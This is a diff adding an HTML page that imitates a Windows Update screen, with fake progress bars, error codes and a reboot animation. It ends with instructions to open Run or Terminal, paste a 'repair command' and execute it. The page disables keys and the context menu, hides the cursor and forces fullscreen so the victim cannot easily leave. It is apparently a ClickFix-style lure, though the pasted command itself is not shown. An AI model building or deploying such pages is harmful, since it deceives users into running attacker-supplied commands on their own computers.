@@ -1,0 +1,338 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Working on updates</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html, body {
+      height: 100%;
+      overflow: hidden;
+      cursor: none;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+    body {
+      background: #000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      font-family: "Segoe UI", -apple-system, sans-serif;
+      color: #fff;
+    }
+
+    .phase { display: none; width: 100%; height: 100%; position: fixed; inset: 0; }
+    .phase.active { display: flex; align-items: center; justify-content: center; flex-direction: column; }
+
+    .update-phase {
+      background: #0078d4;
+      text-align: center;
+      gap: 20px;
+    }
+    .update-pct {
+      font-size: 96px;
+      font-weight: 200;
+      line-height: 1;
+      letter-spacing: -2px;
+    }
+    .update-text {
+      font-size: 28px;
+      font-weight: 300;
+      opacity: 0.9;
+    }
+    .update-sub {
+      font-size: 14px;
+      font-weight: 300;
+      opacity: 0.6;
+      margin-top: 10px;
+    }
+    .spinner-dots {
+      display: flex;
+      gap: 8px;
+      margin-top: 20px;
+    }
+    .spinner-dots span {
+      width: 10px;
+      height: 10px;
+      background: rgba(255,255,255,0.7);
+      border-radius: 50%;
+      animation: dotPulse 1.6s infinite;
+    }
+    .spinner-dots span:nth-child(2) { animation-delay: 0.2s; }
+    .spinner-dots span:nth-child(3) { animation-delay: 0.4s; }
+    .spinner-dots span:nth-child(4) { animation-delay: 0.6s; }
+    .spinner-dots span:nth-child(5) { animation-delay: 0.8s; }
+    @keyframes dotPulse {
+      0%, 60%, 100% { opacity: 0.3; transform: scale(0.8); }
+      30% { opacity: 1; transform: scale(1); }
+    }
+
+    .error-phase {
+      background: #000;
+      text-align: center;
+      gap: 16px;
+      padding: 40px;
+    }
+    .error-frown {
+      font-size: 80px;
+      font-weight: 200;
+    }
+    .error-title {
+      font-size: 22px;
+      font-weight: 300;
+      max-width: 600px;
+    }
+    .error-detail {
+      font-size: 13px;
+      font-weight: 300;
+      opacity: 0.7;
+      max-width: 500px;
+      line-height: 1.6;
+    }
+    .error-code {
+      font-size: 14px;
+      font-weight: 300;
+      opacity: 0.5;
+      font-family: "Consolas", monospace;
+      margin-top: 8px;
+    }
+    .error-retry {
+      margin-top: 16px;
+      display: flex;
+      gap: 6px;
+      align-items: center;
+      font-size: 14px;
+      opacity: 0.8;
+    }
+    .error-spinner {
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255,255,255,0.2);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .reboot-phase {
+      background: #000;
+      gap: 20px;
+    }
+    .win-logo-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 3px;
+      width: 50px;
+      height: 50px;
+    }
+    .win-logo-grid div { background: #fff; }
+    .reboot-dots {
+      display: flex;
+      gap: 6px;
+    }
+    .reboot-dots span {
+      width: 8px;
+      height: 8px;
+      background: #fff;
+      border-radius: 50%;
+      animation: rebootDot 1.8s infinite;
+      opacity: 0;
+    }
+    .reboot-dots span:nth-child(1) { animation-delay: 0s; }
+    .reboot-dots span:nth-child(2) { animation-delay: 0.15s; }
+    .reboot-dots span:nth-child(3) { animation-delay: 0.3s; }
+    .reboot-dots span:nth-child(4) { animation-delay: 0.45s; }
+    .reboot-dots span:nth-child(5) { animation-delay: 0.6s; }
+    @keyframes rebootDot {
+      0%, 80%, 100% { opacity: 0; transform: scale(0.6); }
+      40% { opacity: 1; transform: scale(1); }
+    }
+
+    .update2-phase {
+      background: #0078d4;
+      text-align: center;
+      gap: 20px;
+    }
+
+    .fail-phase {
+      background: #000;
+      text-align: center;
+      gap: 16px;
+      padding: 40px;
+    }
+    .fail-title {
+      font-size: 22px;
+      font-weight: 300;
+      max-width: 600px;
+      line-height: 1.4;
+    }
+    .fail-instructions {
+      text-align: left;
+      max-width: 500px;
+      font-size: 14px;
+      font-weight: 300;
+      line-height: 1.8;
+      opacity: 0.9;
+      margin-top: 12px;
+    }
+    .fail-instructions b { font-weight: 500; }
+    .fail-instructions kbd {
+      background: #333;
+      padding: 2px 6px;
+      border-radius: 3px;
+      font-family: "Consolas", monospace;
+      font-size: 12px;
+      border: 1px solid #555;
+    }
+    .fail-code {
+      font-size: 12px;
+      font-family: "Consolas", monospace;
+      opacity: 0.4;
+      margin-top: 16px;
+    }
+  </style>
+</head>
+<body>
+  <div class="phase update-phase active" id="phase1">
+    <div class="update-text">Working on updates</div>
+    <div class="update-pct"><span id="pct1">0</span>%</div>
+    <div class="update-sub">Don't turn off your PC. This will take a while.<br>Your PC will restart several times.</div>
+    <div class="spinner-dots">
+      <span></span><span></span><span></span><span></span><span></span>
+    </div>
+  </div>
+
+  <div class="phase error-phase" id="phase2">
+    <div class="error-frown">:(</div>
+    <div class="error-title">We couldn't complete the updates. Undoing changes.</div>
+    <div class="error-detail">Windows Update encountered an unexpected error while installing KB5044284. Your system will restart automatically to recover.</div>
+    <div class="error-code">Error code: 0x800f0922</div>
+    <div class="error-retry">
+      <div class="error-spinner"></div>
+      <span>Reverting changes... <span id="revertPct">0</span>%</span>
+    </div>
+  </div>
+
+  <div class="phase reboot-phase" id="phase3">
+    <div class="win-logo-grid">
+      <div></div><div></div><div></div><div></div>
+    </div>
+    <div class="reboot-dots">
+      <span></span><span></span><span></span><span></span><span></span>
+    </div>
+  </div>
+
+  <div class="phase update2-phase" id="phase4">
+    <div class="update-text">Configuring update for Windows 11</div>
+    <div class="update-pct"><span id="pct2">0</span>%</div>
+    <div class="update-sub">Stage 2 of 3 — Do not turn off your computer</div>
+    <div class="spinner-dots">
+      <span></span><span></span><span></span><span></span><span></span>
+    </div>
+  </div>
+
+  <div class="phase fail-phase" id="phase5">
+    <div class="error-frown">:(</div>
+    <div class="fail-title">Windows Update failed to install critical security patch.<br>Manual repair is required.</div>
+    <div class="error-code">Error: 0x80070005 — ACCESS_DENIED<br>Component: wuauserv (Windows Update Service)</div>
+    <div class="fail-instructions" id="failInstructions"></div>
+    <div class="fail-code">Failure audit logged: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update\RebootRequired</div>
+  </div>
+
+  <script>
+    const phases = document.querySelectorAll(".phase");
+    function showPhase(n) {
+      phases.forEach((p, i) => p.classList.toggle("active", i === n));
+    }
+
+    function animatePct(el, from, to, stuckAt, stuckDuration, totalDuration) {
+      return new Promise(resolve => {
+        let current = from;
+        const steps = to - from;
+        const normalDelay = (totalDuration - stuckDuration) / steps;
+
+        function tick() {
+          if (current >= to) { resolve(); return; }
+          current++;
+          el.textContent = current;
+          let delay = normalDelay + Math.random() * 100;
+          if (stuckAt && current === stuckAt) delay = stuckDuration;
+          if (current > 85) delay = normalDelay * 2;
+          setTimeout(tick, delay);
+        }
+        tick();
+      });
+    }
+
+    async function sequence() {
+      await animatePct(document.getElementById("pct1"), 0, 73, 31, 4000, 12000);
+
+      document.getElementById("pct1").textContent = "73";
+      await new Promise(r => setTimeout(r, 3000));
+      document.getElementById("pct1").textContent = "73";
+      await new Promise(r => setTimeout(r, 2000));
+
+      showPhase(1);
+      await animatePct(document.getElementById("revertPct"), 0, 100, 45, 3000, 8000);
+      await new Promise(r => setTimeout(r, 1500));
+
+      showPhase(2);
+      await new Promise(r => setTimeout(r, 4000));
+
+      showPhase(3);
+      await animatePct(document.getElementById("pct2"), 0, 38, 22, 2000, 6000);
+
+      document.getElementById("pct2").textContent = "38";
+      await new Promise(r => setTimeout(r, 5000));
+
+      showPhase(4);
+
+      const ua = navigator.userAgent;
+      const platform = navigator?.userAgentData?.platform || navigator.platform;
+      const isMac = /mac/i.test(platform);
+      const isLinux = /linux/i.test(platform) && !/android/i.test(ua);
+
+      const instructions = document.getElementById("failInstructions");
+
+      if (isMac) {
+        instructions.innerHTML = `
+          <p>To complete the update manually:</p>
+          <p>1. Open <b>Terminal</b> (<kbd>Cmd</kbd> + <kbd>Space</kbd>, type Terminal)</p>
+          <p>2. Paste the repair command with <kbd>Cmd</kbd> + <kbd>V</kbd></p>
+          <p>3. Press <kbd>Return</kbd> to execute</p>
+        `;
+      } else if (isLinux) {
+        instructions.innerHTML = `
+          <p>To complete the update manually:</p>
+          <p>1. Open your <b>Terminal</b></p>
+          <p>2. Paste with <kbd>Ctrl</kbd> + <kbd>Shift</kbd> + <kbd>V</kbd></p>
+          <p>3. Press <kbd>Enter</kbd> to execute</p>
+        `;
+      } else {
+        instructions.innerHTML = `
+          <p>To complete the update manually:</p>
+          <p>1. Press <kbd>Win</kbd> + <kbd>R</kbd> to open Run</p>
+          <p>2. Press <kbd>Ctrl</kbd> + <kbd>V</kbd> to paste the repair command</p>
+          <p>3. Press <kbd>Enter</kbd> to execute the Windows Update repair tool</p>
+        `;
+      }
+    }
+
+    sequence();
+
+    document.addEventListener("contextmenu", e => e.preventDefault());
+    document.addEventListener("keydown", e => {
+      if (["F5","F11","F12","Escape"].includes(e.key) || (e.ctrlKey && e.key === "w")) e.preventDefault();
+    });
+
+    if (document.documentElement.requestFullscreen) {
+      document.addEventListener("click", () => {
+        document.documentElement.requestFullscreen().catch(() => {});
+      }, { once: true });
+    }
+  </script>
+  <script src="/tetapux/disclaimer.js" async></script>
+</body>
+</html>
